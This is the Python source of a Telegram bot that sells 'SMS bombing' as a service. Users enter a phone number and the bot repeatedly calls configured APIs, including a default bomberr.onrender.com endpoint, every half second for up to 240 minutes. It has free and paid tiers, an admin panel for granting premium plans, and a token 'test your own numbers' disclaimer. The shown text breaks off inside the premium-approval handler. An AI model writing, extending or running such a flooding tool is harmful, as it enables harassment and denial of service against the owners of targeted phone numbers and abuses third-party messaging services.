# bomber.py
import logging
import os
import json
import random
import time
from typing import List, Dict, Any
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
import requests
import re
import asyncio
from datetime import datetime, timedelta, date

# -----------------------------
# ᴄᴏɴꜰɪɢᴜʀᴀᴛɪᴏɴ
# -----------------------------
BOT_TOKEN = "858365596"
ADMIN_ID = 778
OWNER_USERNAME = "VIKRANT-project"

# ꜰʀᴇᴇ ᴛɪᴇʀ ʟɪᴍɪᴛꜱ
FREE_DAILY_LIMIT = 2
FREE_MAX_DURATION_MIN = 1

# ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴꜱ
PLANS = {
    "silver": ("ꜱɪʟᴠᴇʀ ꜱᴛʀɪᴋᴇ", 10, "ᴍᴏᴅᴇʀᴀᴛᴇ ꜱᴘᴇᴇᴅ & ꜱᴛᴀʙɪʟɪᴛʏ — 10 ᴍɪɴᴜᴛᴇꜱ"),
    "gold": ("ɢᴏʟᴅᴇɴ ꜱᴛᴏʀᴍ", 60, "ꜰᴀꜱᴛᴇʀ ʀᴇQᴜᴇꜱᴛꜱ, ʜɪɢʜᴇʀ ʟɪᴍɪᴛꜱ — 1 ʜᴏᴜʀ"),
    "diamond": ("ᴅɪᴀᴍᴏɴᴅ ꜰᴜʀʏ", 240, "ᴍᴀxɪᴍᴜᴍ ᴘᴏᴡᴇʀ & ꜱᴘᴇᴇᴅ — 4 ʜᴏᴜʀꜱ"),
}

# ʙᴏᴍʙɪɴɢ ᴄᴀʟʟ ɪɴᴛᴇʀᴠᴀʟ
CALL_INTERVAL = 0.5

# ᴀᴘɪ ꜱᴛᴏʀᴀɢᴇ ꜰɪʟᴇ
API_FILE = "apis.json"
USER_DATA_FILE = "users.json"

# ᴛɪᴍᴇᴏᴜᴛ ꜰᴏʀ ʜᴇᴀʟᴛʜ ᴄʜᴇᴄᴋꜱ
API_HEALTH_TIMEOUT = 2.0

# -----------------------------
# ʟᴏɢɢɪɴɢ
# -----------------------------
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# -----------------------------
# ɪɴ‑ᴍᴇᴍᴏʀʏ ꜱᴛᴏʀᴀɢᴇ
# -----------------------------
user_sessions: Dict[int, Dict[str, Any]] = {}
premium_users: Dict[int, Dict[str, Any]] = {}
daily_usage: Dict[int, Dict[str, Any]] = {}
user_stats: Dict[int, Dict[str, Any]] = {}
all_users: Dict[int, Dict[str, Any]] = {}  # Store all user data

# ᴀᴘɪꜱ ɪɴꜰᴏ ʟᴏᴀᴅᴇᴅ ꜰʀᴏᴍ ᴀᴘɪꜱ.ᴊꜱᴏɴ
apis: List[Dict[str, Any]] = []

# ʙᴀᴄᴋɢʀᴏᴜɴᴅ ᴛᴀꜱᴋꜱ ᴍᴀᴘ
background_tasks: Dict[int, asyncio.Task] = {}

# ᴀᴅᴍɪɴ ꜱᴛᴀᴛᴇ
admin_state: Dict[int, Dict[str, Any]] = {}

# -----------------------------
# ᴜᴛɪʟɪᴛʏ: ᴘᴇʀꜱɪꜱᴛ/ʟᴏᴀᴅ ᴀᴘɪꜱ ᴀɴᴅ ᴜꜱᴇʀꜱ
# -----------------------------
def _ensure_data_files():
    if not os.path.exists(API_FILE):
        default = [{
            "url": "http://bomberr.onrender.com/num={phone}",
            "uses": 0,
            "success": 0,
            "fail": 0,
            "last_used": None,
            "last_resp_ms": None
        }]
        with open(API_FILE, "w") as f:
            json.dump(default, f, indent=2)
    
    if not os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "w") as f:
            json.dump({}, f, indent=2)

def load_apis():
    global apis
    _ensure_data_files()
    try:
        with open(API_FILE, "r") as f:
            apis = json.load(f)
            for a in apis:
                if "uses" not in a: a["uses"] = 0
                if "success" not in a: a["success"] = 0
                if "fail" not in a: a["fail"] = 0
                if "last_used" not in a: a["last_used"] = None
                if "last_resp_ms" not in a: a["last_resp_ms"] = None
    except Exception as e:
        logger.error(f"ꜰᴀɪʟᴇᴅ ᴛᴏ ʟᴏᴀᴅ {API_FILE}: {e}")
        apis = [{
            "url": "http://bomberr.onrender.com/num={phone}",
            "uses": 0,
            "success": 0,
            "fail": 0,
            "last_used": None,
            "last_resp_ms": None
        }]
        save_apis()

def save_apis():
    try:
        with open(API_FILE, "w") as f:
            json.dump(apis, f, indent=2)
    except Exception as e:
        logger.error(f"ꜰᴀɪʟᴇᴅ ᴛᴏ ꜱᴀᴠᴇ {API_FILE}: {e}")

def load_users():
    global all_users
    try:
        with open(USER_DATA_FILE, "r") as f:
            all_users = json.load(f)
    except Exception as e:
        logger.error(f"ꜰᴀɪʟᴇᴅ ᴛᴏ ʟᴏᴀᴅ ᴜꜱᴇʀꜱ: {e}")
        all_users = {}

def save_users():
    try:
        with open(USER_DATA_FILE, "w") as f:
            json.dump(all_users, f, indent=2)
    except Exception as e:
        logger.error(f"ꜰᴀɪʟᴇᴅ ᴛᴏ ꜱᴀᴠᴇ ᴜꜱᴇʀꜱ: {e}")

def update_user_info(user_id: int, username: str = None, first_name: str = None, last_name: str = None):
    """ᴜᴘᴅᴀᴛᴇ ᴜꜱᴇʀ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ɪɴ ᴅᴀᴛᴀʙᴀꜱᴇ"""
    if user_id not in all_users:
        all_users[user_id] = {
            "id": user_id,
            "username": username,
            "first_name": first_name,
            "last_name": last_name,
            "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "total_calls": 0,
            "premium": False,
            "premium_plan": None,
            "premium_until": None
        }
    else:
        all_users[user_id]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if username:
            all_users[user_id]["username"] = username
        if first_name:
            all_users[user_id]["first_name"] = first_name
        if last_name:
            all_users[user_id]["last_name"] = last_name
    
    save_users()

load_apis()
load_users()

# -----------------------------
# ʜᴇʟᴘᴇʀꜱ: ꜱʏɴᴄ ʜᴛᴛᴘ ᴄᴀʟʟ
# -----------------------------
def _http_get(url: str, timeout=10):
    """Synchronous GET with timing and basic error handling"""
    start = time.time()
    try:
        r = requests.get(url, timeout=timeout)
        elapsed = (time.time() - start) * 1000.0
        return {"ok": True, "status_code": r.status_code, "elapsed_ms": elapsed, "text": r.text}
    except Exception as e:
        elapsed = (time.time() - start) * 1000.0
        return {"ok": False, "error": str(e), "elapsed_ms": elapsed}

async def http_get_async(url: str, timeout=10):
    return await asyncio.to_thread(_http_get, url, timeout)

# -----------------------------
# ʜᴇᴀʟᴛʜ ᴄʜᴇᴄᴋ ʜᴇʟᴘᴇʀ
# -----------------------------
async def check_api_health(api_url: str) -> Dict[str, Any]:
    test_url = api_url.replace("{phone}", "0000000000")
    result = await http_get_async(test_url, timeout=API_HEALTH_TIMEOUT)
    status = {}
    if result["ok"]:
        resp_ms = result["elapsed_ms"]
        code = result.get("status_code", None)
        if code == 200:
            state = "ᴀᴄᴛɪᴠᴇ"
        else:
            state = "ᴇʀʀᴏʀ"
        if resp_ms > 2000:
            perf = "ꜱʟᴏᴡ"
        else:
            perf = "ᴏᴋ"
        status = {
            "state": state,
            "perf": perf,
            "resp_ms": round(resp_ms, 1),
            "status_code": code
        }
    else:
        status = {
            "state": "ᴅᴇᴀᴅ",
            "perf": "ᴅᴇᴀᴅ",
            "resp_ms": round(result.get("elapsed_ms", 0), 1),
            "error": result.get("error")
        }
    return status

# -----------------------------
# ʜɪɢʜ‑ʟᴇᴠᴇʟ ᴀᴘɪ ꜱᴇʟᴇᴄᴛɪᴏɴ & ᴜꜱᴀɢᴇ
# -----------------------------
def _get_random_api() -> Dict[str, Any]:
    if not apis:
        return {"url": "http://bomberr.onrender.com/num={phone}", "uses": 0, "success": 0, "fail": 0, "last_used": None, "last_resp_ms": None}
    return random.choice(apis)

def _record_api_result(api_obj: Dict[str, Any], success: bool, resp_ms: float):
    api_obj["uses"] = api_obj.get("uses", 0) + 1
    if success:
        api_obj["success"] = api_obj.get("success", 0) + 1
    else:
        api_obj["fail"] = api_obj.get("fail", 0) + 1
    api_obj["last_used"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    api_obj["last_resp_ms"] = resp_ms
    save_apis()

# -----------------------------
# ꜱᴛᴀʀᴛ ʜᴀɴᴅʟᴇʀ
# -----------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    # ᴜᴘᴅᴀᴛᴇ ᴜꜱᴇʀ ɪɴꜰᴏ
    update_user_info(user_id, user.username, user.first_name, user.last_name)
    
    welcome_text = (
        "╔══════════════════════════════╗\n"
        "       🔥 ꜱᴍꜱ ʙᴏᴍʙᴇʀ 🔥\n"
        "╚══════════════════════════════╝\n\n"
        
        f"✨ *ᴡᴇʟᴄᴏᴍᴇ, {user.first_name}!*\n\n"
        
        "📊 *ꜰʀᴇᴇ ᴛɪᴇʀ* 📊\n"
        f"├─ 📅 {FREE_DAILY_LIMIT} ꜱᴇꜱꜱɪᴏɴꜱ/ᴅᴀʏ\n"
        f"└─ ⏰ ᴜᴘ ᴛᴏ {FREE_MAX_DURATION_MIN} ᴍɪɴ ᴇᴀᴄʜ\n\n"
        
        "💎 *ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴꜱ* 💎\n"
        f"├─ 🥈 ꜱɪʟᴠᴇʀ ─ 10 ᴍɪɴ\n"
        f"├─ 🥇 ɢᴏʟᴅ ─ 60 ᴍɪɴ\n"
        f"└─ 💎 ᴅɪᴀᴍᴏɴᴅ ─ 240 ᴍɪɴ\n\n"
        
        "⚠️ *ɪᴍᴘᴏʀᴛᴀɴᴛ* ⚠️\n"
        "• ᴏɴʟʏ ᴛᴇꜱᴛ ʏᴏᴜʀ ᴏᴡɴ ɴᴜᴍʙᴇʀꜱ\n"
        "• ɴᴏ ɪʟʟᴇɢᴀʟ ᴜꜱᴇ\n"
        "• ʀᴇꜱᴘᴇᴄᴛ ᴘʀɪᴠᴀᴄʏ\n\n"
        
        f"👑 ᴏᴡɴᴇʀ: {OWNER_USERNAME}\n"
        "═══════════════════════════════"
    )
    
    # ʙᴜᴛᴛᴏɴ ʟᴀʏᴏᴜᴛ
    row1 = [
        InlineKeyboardButton("🚀 ꜱᴛᴀʀᴛ ʙᴏᴍʙɪɴɢ", callback_data="start_bombing"),
        InlineKeyboardButton("🛑 ꜱᴛᴏᴘ ʙᴏᴍʙɪɴɢ", callback_data="stop_bombing")
    ]
    row2 = [
        InlineKeyboardButton("👤 ᴍʏ ᴀᴄᴄᴏᴜɴᴛ", callback_data="my_account"),
        InlineKeyboardButton("💎 ʙᴜʏ ᴘʀᴇᴍɪᴜᴍ", callback_data="buy_premium")
    ]
    
    keyboard = [row1, row2]

    # ᴀᴅᴍɪɴ‑ᴏɴʟʏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ʙᴜᴛᴛᴏɴ
    if user_id == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("🛠 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="admin_panel")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        if update.message:
            await update.message.reply_text(
                welcome_text, 
                reply_markup=reply_markup, 
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
        elif update.callback_query:
            await update.callback_query.edit_message_text(
                welcome_text, 
                reply_markup=reply_markup, 
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
    except Exception as e:
        logger.error(f"ᴇʀʀᴏʀ ɪɴ ꜱᴛᴀʀᴛ ᴄᴏᴍᴍᴀɴᴅ: {e}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=welcome_text,
            parse_mode='Markdown',
            disable_web_page_preview=True
        )

# -----------------------------
# ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ
# -----------------------------
async def show_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if user_id != ADMIN_ID:
        await query.answer("🚫 ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ!", show_alert=True)
        return
    
    await query.answer()
    
    # ᴄᴀʟᴄᴜʟᴀᴛᴇ ꜱᴛᴀᴛꜱ
    total_users = len(all_users)
    premium_count = sum(1 for u in all_users.values() if u.get("premium", False))
    free_users = total_users - premium_count
    
    admin_text = (
        "╔══════════════════════════════╗\n"
        "       🛠 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ 🛠\n"
        "╚══════════════════════════════╝\n\n"
        
        "📊 *ꜱʏꜱᴛᴇᴍ ꜱᴛᴀᴛꜱ*\n"
        f"├─ 👥 ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ: {total_users}\n"
        f"├─ 💎 ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀꜱ: {premium_count}\n"
        f"└─ 🆓 ꜰʀᴇᴇ ᴜꜱᴇʀꜱ: {free_users}\n\n"
        
        "⚙️ *ᴍᴀɴᴀɢᴇᴍᴇɴᴛ ᴛᴏᴏʟꜱ*\n"
        "ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ᴛᴏ ᴍᴀɴᴀɢᴇ:"
    )
    
    # ᴀᴅᴍɪɴ ʙᴜᴛᴛᴏɴꜱ
    row1 = [
        InlineKeyboardButton("✅ ᴀᴘᴘʀᴏᴠᴇ ᴜꜱᴇʀ", callback_data="admin_approve"),
        InlineKeyboardButton("❌ ᴅɪꜱᴀᴘᴘʀᴏᴠᴇ", callback_data="admin_disapprove")
    ]
    row2 = [
        InlineKeyboardButton("📋 ᴀʟʟ ᴜꜱᴇʀꜱ", callback_data="admin_all_users"),
        InlineKeyboardButton("⚙️ ᴀʟʟ ᴄᴍᴅ", callback_data="admin_all_cmds")
    ]
    row3 = [
        InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="back_to_start")
    ]
    
    keyboard = [row1, row2, row3]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(admin_text, reply_markup=reply_markup, parse_mode='Markdown')

# -----------------------------
# ᴀᴅᴍɪɴ: ᴀᴘᴘʀᴏᴠᴇ ᴜꜱᴇʀ
# -----------------------------
async def admin_approve_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if user_id != ADMIN_ID:
        await query.answer("🚫 ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ!", show_alert=True)
        return
    
    await query.answer()
    admin_state[user_id] = {"action": "approve", "step": "user_id"}
    
    approve_text = (
        "✅ *ᴀᴘᴘʀᴏᴠᴇ ᴜꜱᴇʀ*\n\n"
        "ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴀᴘᴘʀᴏᴠᴇ.\n\n"
        "📝 *ꜰᴏʀᴍᴀᴛ*: `1234567890`\n"
        "ᴏɴʟʏ ɴᴜᴍʙᴇʀꜱ, ɴᴏ ꜱᴘᴀᴄᴇꜱ.\n\n"
        "ᴛᴏ ᴄᴀɴᴄᴇʟ, ᴜꜱᴇ /ꜱᴛᴀʀᴛ"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 ᴄᴀɴᴄᴇʟ", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(approve_text, reply_markup=reply_markup, parse_mode='Markdown')

# -----------------------------
# ᴀᴅᴍɪɴ: ᴅɪꜱᴀᴘᴘʀᴏᴠᴇ ᴜꜱᴇʀ
# -----------------------------
async def admin_disapprove_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if user_id != ADMIN_ID:
        await query.answer("🚫 ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ!", show_alert=True)
        return
    
    await query.answer()
    admin_state[user_id] = {"action": "disapprove", "step": "user_id"}
    
    disapprove_text = (
        "❌ *ᴅɪꜱᴀᴘᴘʀᴏᴠᴇ ᴜꜱᴇʀ*\n\n"
        "ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴅɪꜱᴀᴘᴘʀᴏᴠᴇ.\n\n"
        "📝 *ꜰᴏʀᴍᴀᴛ*: `1234567890`\n"
        "ᴏɴʟʏ ɴᴜᴍʙᴇʀꜱ, ɴᴏ ꜱᴘᴀᴄᴇꜱ.\n\n"
        "ᴛᴏ ᴄᴀɴᴄᴇʟ, ᴜꜱᴇ /ꜱᴛᴀʀᴛ"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 ᴄᴀɴᴄᴇʟ", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(disapprove_text, reply_markup=reply_markup, parse_mode='Markdown')

# -----------------------------
# ᴀᴅᴍɪɴ: ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅꜱ
# -----------------------------
async def admin_all_cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if user_id != ADMIN_ID:
        await query.answer("🚫 ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ!", show_alert=True)
        return
    
    await query.answer()
    
    cmds_text = (
        "╔══════════════════════════════╗\n"
        "       ⚙️ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅꜱ ⚙️\n"
        "╚══════════════════════════════╝\n\n"
        
        "🔧 *ᴀᴘɪ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ*\n"
        "`/ᴀᴅᴅᴀᴘɪ <ᴜʀʟ>` - ᴀᴅᴅ ɴᴇᴡ ᴀᴘɪ\n"
        "`/ʀᴇᴍᴏᴠᴇᴀᴘɪ <ᴜʀʟ>` - ʀᴇᴍᴏᴠᴇ ᴀᴘɪ\n"
        "`/ᴀᴘɪꜱᴛᴀᴛᴜꜱ` - ꜱʜᴏᴡ ᴀᴘɪ ꜱᴛᴀᴛᴜꜱ\n"
        "`/ʀᴇꜱᴇᴛᴀᴘɪꜱ` - ʀᴇꜱᴇᴛ ᴀᴘɪꜱ ᴛᴏ ᴅᴇꜰᴀᴜʟᴛ\n\n"
        
        "👥 *ᴜꜱᴇʀ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ*\n"
        "`/ᴀᴘᴘʀᴏᴠᴇ <ɪᴅ> <ᴘʟᴀɴ> <ᴅᴀʏꜱ>` - ᴀᴘᴘʀᴏᴠᴇ ᴜꜱᴇʀ\n"
        "`/ʀᴇᴠᴏᴋᴇ <ɪᴅ>` - ʀᴇᴠᴏᴋᴇ ᴜꜱᴇʀ\n\n"
        
        "📊 *ꜱᴛᴀᴛꜱ*\n"
        "`/ꜱᴛᴀᴛꜱ` - ꜱʜᴏᴡ ʙᴏᴛ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ\n\n"
        
        "💬 *ᴏᴛʜᴇʀ*\n"
        "`/ʙʀᴏᴀᴅᴄᴀꜱᴛ <ᴍᴇꜱꜱᴀɢᴇ>` - ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴛᴏ ᴀʟʟ\n"
        "`/ᴜꜱᴇʀꜱ` - ꜱʜᴏᴡ ᴀʟʟ ᴜꜱᴇʀꜱ"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(cmds_text, reply_markup=reply_markup, parse_mode='Markdown')

# -----------------------------
# ᴀᴅᴍɪɴ: ᴀʟʟ ᴜꜱᴇʀꜱ
# -----------------------------
async def admin_all_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if user_id != ADMIN_ID:
        await query.answer("🚫 ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ!", show_alert=True)
        return
    
    await query.answer()
    
    if not all_users:
        users_text = "📭 ɴᴏ ᴜꜱᴇʀꜱ ꜰᴏᴜɴᴅ ʏᴇᴛ."
    else:
        # ᴄᴀʟᴄᴜʟᴀᴛᴇ ꜱᴛᴀᴛꜱ
        total_users = len(all_users)
        premium_count = sum(1 for u in all_users.values() if u.get("premium", False))
        
        users_text = (
            "╔══════════════════════════════╗\n"
            "       📋 ᴀʟʟ ᴜꜱᴇʀꜱ 📋\n"
            "╚══════════════════════════════╝\n\n"
            
            f"📊 *ꜱᴜᴍᴍᴀʀʏ*\n"
            f"├─ 👥 ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ: {total_users}\n"
            f"├─ 💎 ᴘʀᴇᴍɪᴜᴍ: {premium_count}\n"
            f"└─ 🆓 ꜰʀᴇᴇ: {total_users - premium_count}\n\n"
            
            "👤 *ᴜꜱᴇʀ ʟɪꜱᴛ*:\n"
        )
        
        # ꜱʜᴏᴡ ꜰɪʀꜱᴛ 10 ᴜꜱᴇʀꜱ
        for idx, (uid, user_data) in enumerate(list(all_users.items())[:10], 1):
            username = user_data.get("username", "ɴᴏ ᴜꜱᴇʀɴᴀᴍᴇ")
            first_name = user_data.get("first_name", "ɴᴏ ɴᴀᴍᴇ")
            premium = "💎" if user_data.get("premium", False) else "🆓"
            plan = user_data.get("premium_plan", "ɴᴏɴᴇ")
            
            users_text += f"{idx}. {premium} `{uid}` - {first_name} (@{username})\n"
            if user_data.get("premium", False):
                users_text += f"   └─ ᴘʟᴀɴ: {plan}\n"
        
        if len(all_users) > 10:
            users_text += f"\n... ᴀɴᴅ {len(all_users) - 10} ᴍᴏʀᴇ ᴜꜱᴇʀꜱ"
    
    keyboard = [[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(users_text, reply_markup=reply_markup, parse_mode='Markdown')

# -----------------------------
# ʜᴀɴᴅʟᴇ ᴀᴅᴍɪɴ ᴍᴇꜱꜱᴀɢᴇꜱ (FIXED)
# -----------------------------
async def handle_admin_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    
    # Only process if user is admin
    if user_id != ADMIN_ID:
        return
    
    # Check if admin is in a state
    if user_id not in admin_state:
        return
    
    text = update.message.text.strip()
    state = admin_state[user_id]
    action = state.get("action")
    
    if state["step"] == "user_id":
        try:
            target_id = int(text)
            state["target_id"] = target_id
            
            if action == "approve":
                state["step"] = "tier"
                
                # ꜱʜᴏᴡ ᴛɪᴇʀ ᴏᴘᴛɪᴏɴꜱ
                tier_text = (
                    f"✅ *ᴀᴘᴘʀᴏᴠᴇ ᴜꜱᴇʀ*: `{target_id}`\n\n"
                    "ᴘʟᴇᴀꜱᴇ ꜱᴇʟᴇᴄᴛ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴛɪᴇʀ:\n\n"
                    "1. 🥈 `ꜱɪʟᴠᴇʀ` - 10 ᴍɪɴᴜᴛᴇ ꜱᴇꜱꜱɪᴏɴꜱ\n"
                    "2. 🥇 `ɢᴏʟᴅ` - 60 ᴍɪɴᴜᴛᴇ ꜱᴇꜱꜱɪᴏɴꜱ\n"
                    "3. 💎 `ᴅɪᴀᴍᴏɴᴅ` - 240 ᴍɪɴᴜᴛᴇ ꜱᴇꜱꜱɪᴏɴꜱ\n\n"
                    "ʀᴇᴘʟʏ ᴡɪᴛʜ ᴛɪᴇʀ ɴᴀᴍᴇ (ꜱɪʟᴠᴇʀ/ɢᴏʟᴅ/ᴅɪᴀᴍᴏɴᴅ)"
                )
                
                await update.message.reply_text(tier_text, parse_mode='Markdown')
                
            elif action == "disapprove":
                state["step"] = "confirm"
                
                # ɢᴇᴛ ᴜꜱᴇʀ ɪɴꜰᴏ
                user_info = all_users.get(target_id, {})
                username = user_info.get("username", "ɴᴏ ᴜꜱᴇʀɴᴀᴍᴇ")
                first_name = user_info.get("first_name", "ɴᴏ ɴᴀᴍᴇ")
                
                confirm_text = (
                    f"❌ *ᴄᴏɴꜰɪʀᴍ ᴅɪꜱᴀᴘᴘʀᴏᴠᴀʟ*\n\n"
                    f"ᴜꜱᴇʀ: `{target_id}`\n"
                    f"ɴᴀᴍᴇ: {first_name}\n"
                    f"ᴜꜱᴇʀɴᴀᴍᴇ: @{username}\n\n"
                    "⚠️ ᴛʜɪꜱ ᴡɪʟʟ ʀᴇᴍᴏᴠᴇ ᴀʟʟ ᴘʀᴇᴍɪᴜᴍ ʙᴇɴᴇꜰɪᴛꜱ!\n\n"
                    "ʀᴇᴘʟʏ `ʏᴇꜱ` ᴛᴏ ᴄᴏɴꜰɪʀᴍ ᴏʀ `ɴᴏ` ᴛᴏ ᴄᴀɴᴄᴇʟ."
                )
                
                await update.message.reply_text(confirm_text, parse_mode='Markdown')
                
        except ValueError:
            await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ. ᴘʟᴇᴀꜱᴇ ᴇɴᴛᴇʀ ᴀ ɴᴜᴍᴇʀɪᴄ ɪᴅ.")
            admin_state.pop(user_id, None)
    
    elif state["step"] == "tier" and action == "approve":
        tier = text.lower().strip()
        
        if tier not in PLANS:
            await update.message.reply_text(
                "❌ ɪɴᴠᴀʟɪᴅ ᴛɪᴇʀ. ᴘʟᴇᴀꜱᴇ ᴄʜᴏᴏꜱᴇ:\n"
                "• ꜱɪʟᴠᴇʀ\n• ɢᴏʟᴅ\n• ᴅɪᴀᴍᴏɴᴅ"
            )
            return
        
        state["tier"] = tier
        state["step"] = "days"
        
        days_text = (
            f"✅ *ᴀᴘᴘʀᴏᴠᴇ ᴜꜱᴇʀ*: `{state['target_id']}`\n"
            f"📦 ᴛɪᴇʀ: {PLANS[tier][0]}\n\n"
            "ɴᴏᴡ ᴘʟᴇᴀꜱᴇ ꜱᴘᴇᴄɪꜰʏ ᴛʜᴇ ᴅᴜʀᴀᴛɪᴏɴ:\n\n"
            "ᴇɴᴛᴇʀ ɴᴜᴍʙᴇʀ ᴏꜰ ᴅᴀʏꜱ (1‑365):\n"
            "ᴇxᴀᴍᴘʟᴇ: `30` ꜰᴏʀ 30 ᴅᴀʏꜱ"
        )
        
        await update.message.reply_text(days_text, parse_mode='Markdown')
    
    elif state["step"] == "days" and action == "approve":
        try:
            days = int(text)
            if days < 1 or days > 365:
                await update.message.reply_text("❌ ᴘʟᴇᴀꜱᴇ ᴇɴᴛᴇʀ ᴀ ɴᴜᴍʙᴇʀ ʙᴇᴛᴡᴇᴇɴ 1 ᴀɴᴅ 365.")
                return
            
            target_id = state["target_id"]
            tier = state["tier"]
            
            # ᴄᴀʟᴄᴜʟᴀᴛᴇ ᴇxᴘɪʀʏ ᴅᴀᴛᴇ
            expiry_date = datetime.now() + timedelta(days=days)
            
            # ᴜᴘᴅᴀᴛᴇ ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀꜱ
            premium_users[target_id] = {
                "plan": tier,
                "approved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "expires_at": expiry_date.strftime("%Y-%m-%d %H:%M:%S"),
                "days": days
            }
            
            # ᴜᴘᴅᴀᴛᴇ ᴀʟʟ ᴜꜱᴇʀꜱ ᴅᴀᴛᴀʙᴀꜱᴇ
            if target_id in all_users:
                all_users[target_id]["premium"] = True
                all_users[target_id]["premium_plan"] = tier
                all_users[target_id]["premium_until"] = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
                save_users()
            
            # ɴᴏᴛɪꜰʏ ᴀᴅᴍɪɴ
            admin_msg = (
                f"✅ *ᴜꜱᴇʀ ᴀᴘᴘʀᴏᴠᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ!*\n\n"
                f"👤 ᴜꜱᴇʀ ɪᴅ: `{target_id}`\n"
                f"💎 ᴘʟᴀɴ: {PLANS[tier][0]}\n"
                f"📅 ᴅᴜʀᴀᴛɪᴏɴ: {days} ᴅᴀʏꜱ\n"
                f"⏰ ᴇxᴘɪʀᴇꜱ: {expiry_date.strftime('%Y-%m-%d')}\n\n"
                f"ᴜꜱᴇʀ ʜᴀꜱ ʙᴇᴇɴ ɴᴏᴛɪꜰɪᴇᴅ."
            )
            
            await update.message.reply_text(admin_msg, parse_mode='Markdown')
            
            # ɴᴏᴛɪꜰʏ ᴛʜᴇ ᴜꜱᴇʀ
            try:
                user_notification = (
                    f"🎉 *ᴄᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴꜱ!*\n\n"
                    f"ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀꜱ ʙᴇᴇɴ ᴜᴘɢʀᴀᴅᴇᴅ ᴛᴏ **{PLANS[tier][0]}** ᴘʟᴀɴ!\n\n"
                    f"✨ *ʙᴇɴᴇꜰɪᴛꜱ ʏᴏᴜ ɢᴇᴛ* ✨\n"
                    f"• ⏰ **{PLANS[tier][1]} ᴍɪɴᴜᴛᴇ** ʙᴏᴍʙɪɴɢ ꜱᴇꜱꜱɪᴏɴꜱ\n"
                    f"• 🚀 {PLANS[tier][2]}\n"
                    f"• 📅 ᴠᴀʟɪᴅ ꜰᴏʀ **{days} ᴅᴀʏꜱ**\n"
                    f"• 🎯 ɴᴏ ᴅᴀɪʟʏ ʟɪᴍɪᴛꜱ\n"
